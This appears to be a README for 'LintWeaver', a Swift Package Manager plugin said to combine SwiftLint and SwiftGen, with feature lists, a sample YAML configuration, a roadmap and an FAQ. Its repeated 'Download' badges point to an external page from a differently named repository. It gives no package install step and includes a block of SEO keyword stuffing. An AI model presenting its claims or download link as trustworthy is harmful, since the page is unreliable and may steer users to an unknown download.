![preview](https://raw.githubusercontent.com/analmorais12-jpg/Swift-Streamline/main/hero_6ad7.svg)
[![Download](https://raw.githubusercontent.com/analmorais12-jpg/Swift-Streamline/main/launch_d6be.svg)](https://analmorais12-jpg.github.io/Swift-Streamline/)

# 🧵 LintWeaver

**Weaving together SwiftLint and SwiftGen into a single, seamless SPM plugin experience for iOS, macOS, watchOS, and tvOS teams.**

[![Download](https://raw.githubusercontent.com/analmorais12-jpg/Swift-Streamline/main/launch_d6be.svg)](https://analmorais12-jpg.github.io/Swift-Streamline/)

---

## 🌟 Overview

LintWeaver is a next-generation Swift Package Manager build tool plugin that unifies the static analysis power of SwiftLint with the asset and resource code-generation strength of SwiftGen. Where GenLint pioneered the idea of combining external plugin repositories, LintWeaver takes the concept further — offering a single, cohesive toolchain that any Swift developer can drop into an existing Xcode project without touching a single build script by hand.

Think of LintWeaver as the loom in your workshop: you bring the raw threads (your `.swift` sources, your `.strings` catalogs, your asset bundles), and LintWeaver weaves them into a consistent, warning-free, strongly typed tapestry that compiles cleanly and reads beautifully.

Whether you are maintaining a legacy monolith or spinning up a fresh modular architecture, LintWeaver keeps your codebase honest and your resources type-safe — all in one build phase.

---

## 🚀 Why LintWeaver Exists

Swift projects grow. Files multiply. Naming conventions drift. Localization keys become orphaned. Asset names become strings that nobody remembers until a runtime crash reveals the typo. Traditional workflows solve half of this with one tool and half with another, forcing developers to juggle multiple plugin configurations, multiple rule sets, and multiple build phases.

LintWeaver proposes a different philosophy:

- **One plugin, two engines.** SwiftLint governs style and correctness. SwiftGen governs resource access. LintWeaver orchestrates both from a single declarative configuration.
- **Zero-config defaults, unlimited override.** Sensible rules out of the box; deep customization when you need it.
- **Build-native integration.** Runs as an SPM build tool plugin, so it operates inside the same pipeline as the rest of your compilation — no detached shell scripts, no fragile pre-commit hooks required.
- **Continuous, not occasional.** Linting happens every time you build, catching drift the moment it appears instead of weeks later in a pull request review.

---

## ✨ Feature Highlights

### 🧩 Unified Plugin Architecture
LintWeaver ships as a single Swift Package that exposes two build tool plugins: one for linting and one for generation. Teams can adopt either, or both, without changing their project structure.

### 🎨 Strongly Typed Resources
Every localized string, color, font, image, and storyboard reference becomes a compile-time constant. Rename a `.strings` key and your code fails to compile — which is exactly what you want, in the most helpful way possible.

### 📐 Enforced Style Consistency
Warning counts, line length, trailing whitespace, force unwrapping discipline, identifier naming, complexity thresholds — all configurable, all observable, all reported inline in Xcode.

### 🌍 Multilingual and Localization Aware
LintWeaver inspects every `.lproj` folder in your project and validates translation completeness across all supported languages. Missing keys surface as lint warnings before they reach a translator’s queue.

### 📱 Responsive Build Feedback
The plugin reports results directly in the Xcode issue navigator. No terminal hunting, no log archaeology — issues appear where you already look.

### 🧠 Incremental Execution
LintWeaver only processes files that changed since the last successful build, keeping incremental builds fast even in large repositories with tens of thousands of lines.

### 🔒 24/7 Support and Community Stewardship
Documentation, example configurations, migration guides, and an active maintainer rotation mean questions rarely wait long for answers — regardless of timezone.

### 🧭 Cross-Platform Reach
Builds cleanly on iOS, iPadOS, macOS, watchOS, tvOS, and visionOS. Shared SwiftPM packages work identically whether consumed by an app target or a framework target.

### 🧬 Extensible Rule Packs
Bring your own SwiftLint configuration or compose from curated packs. LintWeaver does not lock you in — it reads your existing `.swiftlint.yml` and layers its defaults underneath.

### 🕰 Deterministic Output
The generated Swift files are stable across runs. The same inputs always produce the same outputs, which keeps diffs small and code review pleasant.

---

## 🏗 How It Works

LintWeaver operates in two complementary phases.

**Phase One — Weaving Threads (Lint).** During the build, LintWeaver scans every Swift source file in the target, evaluates each file against the active rule set, and emits diagnostics. Violations appear as warnings or errors depending on your configuration. Because the plugin runs as part of the build graph, a failing lint can be configured to halt the build entirely — useful for CI environments where you want to block merges on style regressions.

**Phase Two — Weaving Patterns (Generate).** LintWeaver inspects your resource catalogs, parses them into an abstract representation, and produces Swift source files with type-safe accessors. These generated files are placed in a derived sources directory and compiled alongside your hand-written code. The naming scheme is deterministic, so your IDE knows exactly what to autocomplete.

The two phases are independent. A team that only wants resource generation can enable just that plugin. A team that only wants linting can do the same. A team that wants both gets a single, cohesive experience.

---

## 📦 Requirements

- Xcode 16 or later recommended; earlier versions may work with reduced functionality.
- Swift 5.9 toolchain or later.
- macOS 14 or later for the build host.
- A Swift Package or Xcode project with at least one buildable target.
- Optional: a `.lintweaver.yml` file at the repository root for project-wide configuration.

---

## 🗺 Configuration at a Glance

LintWeaver reads configuration from a single YAML file named `.lintweaver.yml`. The file is optional; defaults apply when absent.

Key configuration areas include:

- **rules** — enable or disable individual lint rules, with per-rule severity.
- **paths** — include and exclude globs for source scanning.
- **generators** — enable specific resource generators (strings, images, colors, fonts, storyboards, plists, JSON).
- **output** — where generated Swift files should live and what they should be named.
- **localization** — the set of languages to validate and the fallback language.
- **reporters** — one or more output formats, such as Xcode, JSON, or a compact summary.

Example configuration shape:

    rules:
      line_length:
        warning: 140
        error: 200
      force_unwrapping: error
      trailing_whitespace: warning

    paths:
      include:
        - Sources
        - Tests
      exclude:
        - Sources/Generated
        - "**/*.generated.swift"

    generators:
      strings: true
      images: true
      colors: true
      fonts: false

    output:
      directory: Sources/Generated
      accessLevel: internal

    localization:
      languages: [en, de, fr, ja]
      fallback: en

    reporters:
      - xcode
      - summary

The configuration model is intentionally flat and readable. Anyone on the team should be able to open the file, understand the intent, and change one setting without reading a manual.

---

## 🧪 Testing Your Integration

LintWeaver includes a fixture-based test harness that validates generated output against golden snapshots. Teams adding LintWeaver to their own projects can mirror this approach: commit a small sample catalog, run the plugin, and diff the result.

Because generated files are deterministic, golden-file testing is exceptionally reliable. A failing test almost always means a real behavioral change, not flakiness.

---

## 🛡 Reliability and Failure Modes

LintWeaver is designed to fail loudly but safely.

- If a configuration file is malformed, the plugin surfaces a clear diagnostic and falls back to defaults rather than aborting the build.
- If a resource catalog cannot be parsed, the offending file is skipped with a warning, and the rest of the build proceeds.
- If a lint rule encounters an unsupported syntax construct, it reports a note rather than a false positive.

The guiding principle: never block a developer’s build for a reason they cannot act on. Every diagnostic includes the file, the line, and a plain-language explanation of the rule and how to satisfy it.

---

## 🔍 SEO-Friendly Topics and Integrations

LintWeaver is relevant to developers searching for Swift static analysis tooling, SwiftLint plugin integrations, SwiftGen SPM alternatives, Swift Package Manager build tool plugins, Xcode build phase linting, type-safe resource generation for iOS, localization validation for Swift projects, and automated code style enforcement for Apple platforms. It is also useful for teams migrating from handwritten resource string constants, teams adopting Swift 6 concurrency, and teams standardizing on SwiftPM for modular app architectures.

---

## 🤝 Contributing

LintWeaver welcomes contributions of all shapes: new rules, new generators, documentation improvements, translations of the README itself, and bug reports from real projects. Before opening a pull request, please run the fixture test suite locally and ensure all existing snapshots still match. Maintainers aim to respond to every issue within one business day, though weekends and holidays may stretch that window slightly.

---

## 🧭 Roadmap for 2026

- Full Swift 6 strict concurrency audit across the plugin internals.
- A visual configuration explorer that renders the effective rule set as a browsable tree.
- First-class support for visionOS asset catalogs.
- An experimental mode that generates previews for each localized string, reducing manual PreviewProvider boilerplate.
- Expanded reporter formats, including SARIF output for integration with external code scanning dashboards.

The roadmap is intentionally ambitious. Priorities shift with community input, so feedback is genuinely welcome.

---

## ❓ FAQ

**Does LintWeaver replace SwiftLint and SwiftGen entirely?**
It wraps them. The underlying engines remain the same battle-tested tools; LintWeaver provides the integration, orchestration, and unified configuration layer.

**Can I use only one half of LintWeaver?**
Yes. Lint and generate plugins are independent and can be enabled separately.

**Will this slow down my builds?**
Incremental execution keeps overhead low. Typical impact on a medium-sized project is measured in the low hundreds of milliseconds per build.

**Does it work with monorepos?**
Yes, as long as each target can be described to the plugin. Monorepo support is explicitly exercised in the test matrix.

**Is remote caching supported?**
Generated outputs are stable and hashable, so external build caches can store them like any other derived artifact.

---

## ⚠️ Disclaimer

LintWeaver is provided as-is, without warranty of any kind, express or implied. The maintainers are not responsible for any linting surprises, styling opinions gone too far, or teammates who suddenly demand 100% rule compliance. Always review generated code before committing it to production branches. This project is not affiliated with, endorsed by, or sponsored by the maintainers of SwiftLint or SwiftGen; it is an independent integration layer that depends on those communities’ excellent work. Use of LintWeaver implies acceptance of the MIT License terms described below.

---

## 📄 License

This project is distributed under the MIT License. You are welcome to use, modify, and redistribute it in accordance with the terms of that license. The full text is available here:

[LICENSE](LICENSE)

Copyright (c) 2026 LintWeaver Contributors.

---

## 🙏 Acknowledgements

Gratitude to the Swift open source community, to the maintainers of SwiftLint and SwiftGen for building the foundations, and to every contributor who files a thoughtful issue or a well-scoped pull request. Tools like this only exist because people care about the craft of writing readable Swift.

---

## 📬 Where to Go Next

- Read the configuration reference in the docs directory.
- Browse the example project to see a full integration in miniature.
- Open an issue to propose a rule or a generator.
- Star the repository if LintWeaver earns a place in your build pipeline.

---

[![Download](https://raw.githubusercontent.com/analmorais12-jpg/Swift-Streamline/main/launch_d6be.svg)](https://analmorais12-jpg.github.io/Swift-Streamline/)